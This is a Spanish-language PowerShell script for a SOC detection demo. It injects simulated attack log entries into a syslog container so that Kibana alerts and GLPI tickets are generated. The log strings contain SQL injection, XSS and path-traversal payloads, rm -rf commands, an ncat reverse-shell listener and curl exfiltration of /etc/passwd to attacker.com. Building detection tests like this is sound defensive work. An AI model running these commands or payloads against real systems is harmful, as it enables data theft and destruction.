# CyberSOC - Script de Simulacion de Ataques (Windows PowerShell)
# Genera eventos de seguridad para demostrar capacidades de deteccion

Write-Host "===================================" -ForegroundColor Cyan
Write-Host "  CyberSOC - Simulador de Ataques" -ForegroundColor Cyan
Write-Host "===================================" -ForegroundColor Cyan
Write-Host ""

# Funcion para simular ataque
function Simulate-Attack {
    param(
        [string]$AttackName,
        [scriptblock]$Command
    )
    
    Write-Host "[*] Simulando: $AttackName" -ForegroundColor Yellow
    & $Command
    Write-Host "[OK] Completado" -ForegroundColor Green
    Write-Host ""
    Start-Sleep -Seconds 2
}


# Menu principal
Write-Host "Selecciona el tipo de ataque a simular:" -ForegroundColor White
Write-Host ""
Write-Host "1.  Ataque de Fuerza Bruta SSH"
Write-Host "2.  SQL Injection"
Write-Host "3.  XSS (Cross-Site Scripting)"
Write-Host "4.  Path Traversal"
Write-Host "5.  Comando Destructivo"
Write-Host "6.  Escalada de Privilegios"
Write-Host "7.  Escaneo de Puertos"
Write-Host "8.  Proceso Sospechoso"
Write-Host "9.  Exfiltracion de Datos"
Write-Host "10. Instalacion de Software"
Write-Host "11. Todos los ataques (Demo completa)"
Write-Host "0.  Salir"
Write-Host ""
$option = Read-Host "Opcion"

switch ($option) {
    "1" {
        Simulate-Attack "Ataque de Fuerza Bruta SSH" {
            for ($i = 1; $i -le 10; $i++) {
                docker exec syslog-client logger -p auth.warning -t sshd "Failed password for admin from 192.168.1.100 port 22 ssh2"
                Start-Sleep -Milliseconds 1000
            }
        }
    }
    "2" {
        Simulate-Attack "SQL Injection" {
            docker exec syslog-client logger -t apache "GET /login.php?id=1' OR '1'='1 HTTP/1.1 - SQL Injection attempt"
        }
    }
    "3" {
        Simulate-Attack "XSS Attack" {
            docker exec syslog-client logger -t apache "GET /search?q=<script>alert('XSS')</script> HTTP/1.1 - XSS attempt"
        }
    }
    "4" {
        Simulate-Attack "Path Traversal" {
            docker exec syslog-client logger -t apache "GET /files?path=../../../etc/passwd HTTP/1.1 - Path traversal attempt"
        }
    }
    "5" {
        Simulate-Attack "Comando Destructivo" {
            docker exec syslog-client logger -t bash "User root executed: rm -rf /important/data"
        }
    }
    "6" {
        Simulate-Attack "Escalada de Privilegios" {
            docker exec syslog-client logger -p auth.info -t su "User hacker changed to root successfully"
        }
    }
    "7" {
        Simulate-Attack "Escaneo de Puertos" {
            docker exec syslog-client logger -t nmap "Starting Nmap scan on 192.168.1.0/24"
            docker exec syslog-client logger -t nmap "Discovered open port 22/tcp on 192.168.1.50"
            docker exec syslog-client logger -t nmap "Discovered open port 80/tcp on 192.168.1.50"
        }
    }
    "8" {
        Simulate-Attack "Proceso Sospechoso" {
            docker exec syslog-client logger -t bash "Process started: ncat -lvp 4444"
            docker exec syslog-client logger -t bash "Reverse shell connection established"
        }
    }
    "9" {
        Simulate-Attack "Exfiltracion de Datos" {
            docker exec syslog-client logger -t bash "User executed: curl -X POST /etc/passwd attacker.com/exfil"
        }
    }
    "10" {
        Simulate-Attack "Instalacion de Software" {
            docker exec syslog-client logger -t apt "User executed: apt install netcat-traditional"
        }
    }
    "11" {
        Write-Host "[!] Ejecutando TODOS los ataques - Demo Completa" -ForegroundColor Red
        Write-Host ""
        
        Simulate-Attack "1/10 - Ataque de Fuerza Bruta SSH" {
            for ($i = 1; $i -le 15; $i++) {
                docker exec syslog-client logger -p auth.warning -t sshd "Failed password for admin from 10.0.0.50 port 22 ssh2"
                Start-Sleep -Milliseconds 1000
            }
        }
        
        Simulate-Attack "2/10 - SQL Injection" {
            docker exec syslog-client logger -t apache "GET /login.php?id=1 UNION SELECT * FROM users HTTP/1.1"
        }
        
        Simulate-Attack "3/10 - XSS Attack" {
            docker exec syslog-client logger -t apache "GET /comment?text=<script>alert('XSS')</script> HTTP/1.1"
        }
        
        Simulate-Attack "4/10 - Path Traversal" {
            docker exec syslog-client logger -t apache "GET /download?file=../../../../etc/shadow HTTP/1.1"
        }
        
        Simulate-Attack "5/10 - Comando Destructivo" {
            docker exec syslog-client logger -t bash "User www-data executed: rm -rf /var/www/html/*"
        }
        
        Simulate-Attack "6/10 - Escalada de Privilegios" {
            docker exec syslog-client logger -p auth.notice -t sudo "User www-data executed /bin/bash as root"
        }
        
        Simulate-Attack "7/10 - Escaneo de Puertos" {
            docker exec syslog-client logger -t nmap "Starting Nmap scan on 192.168.1.0/24"
            docker exec syslog-client logger -t nmap "Discovered open port 22/tcp on 192.168.1.50"
            docker exec syslog-client logger -t nmap "Discovered open port 80/tcp on 192.168.1.50"
        }
        
        Simulate-Attack "8/10 - Proceso Sospechoso" {
            docker exec syslog-client logger -t bash "Process started: ncat -lvp 4444"
            docker exec syslog-client logger -t bash "Reverse shell connection established"
        }
        
        Simulate-Attack "9/10 - Exfiltracion de Datos" {
            docker exec syslog-client logger -t bash "User backup executed: curl -X POST -d file /etc/passwd http://attacker.com/exfil"
        }
        
        Simulate-Attack "10/10 - Instalacion No Autorizada" {
            docker exec syslog-client logger -t dpkg "Installed: nmap netcat tor"
        }
        
        Write-Host "[OK] Demo completa finalizada" -ForegroundColor Green
        Write-Host "[*] Revisa Kibana para ver las alertas" -ForegroundColor Yellow
    }
    "0" {
        Write-Host "Saliendo..." -ForegroundColor Gray
        exit 0
    }
    default {
        Write-Host "[!] Opcion invalida" -ForegroundColor Red
        exit 1
    }
}

Write-Host ""
Write-Host "===================================" -ForegroundColor Green
Write-Host "  Simulacion completada" -ForegroundColor Green
Write-Host "===================================" -ForegroundColor Green
Write-Host ""
Write-Host "Proximos pasos:" -ForegroundColor Cyan
Write-Host "1. Accede a Kibana: http://localhost:5601" -ForegroundColor White
Write-Host "2. Ve a Discover y busca: tags:security_event" -ForegroundColor White
Write-Host "3. Filtra por severidad: severity:critical o severity:high" -ForegroundColor White
Write-Host "4. Accede a GLPI: http://localhost:9000 (usuario: glpi, pass: glpi)" -ForegroundColor White
Write-Host "5. Ve a Asistencia > Tickets para ver los tickets creados automaticamente" -ForegroundColor White
Write-Host ""
Write-Host "[!] Nota: Los tickets se crean automaticamente en GLPI cuando los eventos llegan a Elasticsearch" -ForegroundColor Yellow
Write-Host "      (El contenedor glpi-automation los procesa en segundo plano)" -ForegroundColor Yellow
Write-Host ""
